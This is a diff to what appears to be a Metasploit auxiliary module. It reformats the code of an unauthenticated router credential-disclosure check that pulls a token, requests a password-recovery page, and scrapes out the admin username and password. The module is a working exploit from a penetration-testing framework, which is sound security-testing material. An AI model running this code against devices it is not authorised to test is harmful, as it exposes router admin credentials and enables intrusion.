@@ -68,21 +68,14 @@ class MetasploitModule < Msf::Auxiliary
         print_error("#{rhost} is not vulnerable: Token not found")
         return
       end
-
       print_status("Token found: #{token}")
       vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
-      
       r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
-
       if r.to_s.include?('left">') != nil
-        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td>
-			<td class=\"MNUText\" align=\"left\">", "</td>")
-        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td>
-			<td class=\"MNUText\" align=\"left\">", "</td>")
-
+        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
+        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
         print_good("Creds found: #{username}/#{password}")
-        
       else 
         print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
@@ -102,7 +95,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     data = res.to_s
-    
     # Checks for the `WWW-Authenticate` header in the response
     if data.include? "WWW-Authenticate"
       marker_one = "Basic realm=\""
